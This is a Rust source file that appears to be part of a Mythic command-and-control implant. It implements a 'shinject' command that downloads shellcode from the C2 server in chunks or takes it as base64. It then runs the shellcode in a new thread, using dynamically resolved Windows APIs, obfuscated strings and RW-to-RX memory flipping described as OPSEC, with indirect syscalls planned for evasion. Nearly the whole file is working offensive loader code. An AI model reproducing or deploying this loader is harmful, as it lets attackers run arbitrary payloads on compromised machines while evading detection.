use crate::{AgentTask, ContinuedData, mythic_success};
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use std::mem;

#[cfg(target_os = "windows")]
use winapi::shared::minwindef::DWORD;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;

// WAIT_TIMEOUT constant
#[cfg(target_os = "windows")]
const WAIT_TIMEOUT: DWORD = 0x102;

/// Chunk size used for file transfer
const CHUNK_SIZE: usize = 512000;

/// ShinjectArgs
#[derive(Serialize, Deserialize, Debug)]
pub struct ShinjectArgs {
    #[serde(rename = "shellcode-file-id")]
    pub shellcode_file_id: Option<String>,
    #[serde(rename = "shellcode-base64")]
    pub shellcode_base64: Option<String>,
    #[serde(rename = "process-id")]
    pub process_id: Option<u32>,
}

/// Inject shellcode - background task version that receives file through channels
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn inject_shellcode(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;

    // Get shellcode bytes
    let shellcode_bytes = if let Some(b64) = &args.shellcode_base64 {
        // Direct base64 shellcode
        general_purpose::STANDARD.decode(b64)
            .map_err(|e| format!("{}: {}", crate::obfstr::d(crate::obfstr::S_FAIL_DECODE), e))?
    } else if let Some(file_id) = &args.shellcode_file_id {
        // Download shellcode from Mythic - send request for first chunk
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": 1,
            }),
            "task_id": task.id,
            "user_output": format!("{} 1\n", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DOWNLOAD)),
        }))?;

        // Receive first chunk
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
        let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
        let total_chunks = continued_args.total_chunks.unwrap();
        
        // Get remaining chunks if any
        for chunk_num in 2..=total_chunks {
            tx.send(json!({
                "upload": json!({
                    "chunk_size": CHUNK_SIZE,
                    "file_id": file_id,
                    "chunk_num": chunk_num,
                }),
                "task_id": task.id,
                "user_output": format!("{} {}/{}\n", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DOWNLOAD), chunk_num, total_chunks),
            }))?;

            let task: AgentTask = serde_json::from_value(rx.recv()?)?;
            let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
            file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
        }
        file_data
    } else {
        return Err(crate::obfstr::d(crate::obfstr::S_NO_SHELLCODE).into());
    };

    if shellcode_bytes.is_empty() {
        return Err(crate::obfstr::d(crate::obfstr::S_SHELLCODE_EMPTY).into());
    }

    // Execute shellcode in current process in a spawned thread
    let shellcode_size = shellcode_bytes.len();
    let shellcode_bytes_clone = shellcode_bytes.clone();
    
    std::thread::spawn(move || {
        unsafe {
            if let Err(e) = execute_shellcode_in_thread(&shellcode_bytes_clone) {
                eprintln!("{}: {}", crate::obfstr::d(crate::obfstr::S_SHELLCODE_BG_FAIL), e);
            }
        }
    });
    
    // Return immediately without waiting for shellcode to finish
    tx.send(mythic_success!(
        task.id,
        format!("{} ({} bytes). {}.", crate::obfstr::d(crate::obfstr::S_SHELLCODE_RUNNING), shellcode_size, crate::obfstr::d(crate::obfstr::S_SHELLCODE_THREAD))
    ))?;
    
    Ok(())
}


/// Placeholder - not reached with new implementation
#[cfg(not(target_os = "windows"))]
pub fn inject_shellcode(
    _tx: &mpsc::Sender<serde_json::Value>,
    _rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    Err(format!("shinject {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY)).into())
}

/// Execute shellcode in a thread (in-process execution)
// Future: integrate DInvoke_rs by @Kudaes for indirect syscalls
#[cfg(target_os = "windows")]
unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
    let buffer_size = shellcode.len();

    // Type definitions for dynamically resolved functions
    type VirtualAllocFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
    type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
    type VirtualFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
    type CreateThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
    type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
    type GetExitCodeThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut u32) -> i32;

    // Dynamically resolve APIs at runtime
    let virtual_alloc: VirtualAllocFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_ALLOC)))?
    );
    let virtual_protect: VirtualProtectFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_PROTECT)))?
    );
    let virtual_free: VirtualFreeFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
            .ok_or_else(|| "VirtualFree: resolve failed".to_string())?
    );
    let create_thread: CreateThreadFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "CreateThread")
            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_CREATE_THREAD)))?
    );
    let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject")
            .ok_or_else(|| "WaitForSingleObject: resolve failed".to_string())?
    );
    let close_handle: CloseHandleFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
            .ok_or_else(|| "CloseHandle: resolve failed".to_string())?
    );
    let get_exit_code_thread: GetExitCodeThreadFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "GetExitCodeThread")
            .ok_or_else(|| "GetExitCodeThread: resolve failed".to_string())?
    );

    // Use numeric constants instead of named winapi constants
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const MEM_RELEASE: u32 = 0x8000;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READ: u32 = 0x20;

    let executable_mem = virtual_alloc(
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if executable_mem.is_null() {
        return Err(format!(
            "{}: {}",
            crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_ALLOC),
            GetLastError()
        ));
    }

    // Copy shellcode to the allocated memory
    ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        executable_mem as *mut u8,
        buffer_size,
    );

    // Flip RW to RX (no write after copy — proper OPSEC)
    let mut old_protect: u32 = 0;
    if virtual_protect(executable_mem, buffer_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
        virtual_free(executable_mem, 0, MEM_RELEASE);
        return Err(format!("{}: {}", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_PROTECT), GetLastError()));
    }

    // Create thread to execute shellcode
    let mut thread_id: u32 = 0;
    let thread_handle = create_thread(
        ptr::null_mut(),
        0,
        Some(mem::transmute(executable_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if thread_handle.is_null() {
        virtual_free(executable_mem, 0, MEM_RELEASE);
        return Err(format!(
            "{}: {}",
            crate::obfstr::d(crate::obfstr::S_API_CREATE_THREAD),
            GetLastError()
        ));
    }

    // Wait for thread with timeout (1 second)
    let wait_result = wait_for_single_object(thread_handle, 1000);
    let mut exit_code: u32 = 0;
    get_exit_code_thread(thread_handle, &mut exit_code);
    close_handle(thread_handle);

    // Don't free memory - shellcode might still be running

    if wait_result == WAIT_TIMEOUT {
        Ok(format!(
            "{} ({} bytes) in thread {}. Thread is still running (timeout reached).",
            crate::obfstr::d(crate::obfstr::S_SHELLCODE_START),
            buffer_size, thread_id
        ))
    } else {
        Ok(format!(
            "{} ({} bytes) in thread {} (exit code: {}, wait result: {}).",
            crate::obfstr::d(crate::obfstr::S_SHELLCODE_DONE),
            buffer_size, thread_id, exit_code, wait_result
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let json_args = r#"{"shellcode-file-id": "test_file_id"}"#;
        let args: ShinjectArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.shellcode_file_id, Some("test_file_id".to_string()));
    }

    #[test]
    fn test_shinject_base64_decode() {
        let sample = vec![0x90, 0x90, 0x90, 0x90];
        let b64 = general_purpose::STANDARD.encode(&sample);
        let json_args = format!(r#"{{"shellcode-base64":"{}"}}"#, b64);
        let args: ShinjectArgs = serde_json::from_str(&json_args).unwrap();
        let decoded = general_purpose::STANDARD.decode(&args.shellcode_base64.unwrap()).unwrap();
        assert_eq!(decoded, sample);
    }
}
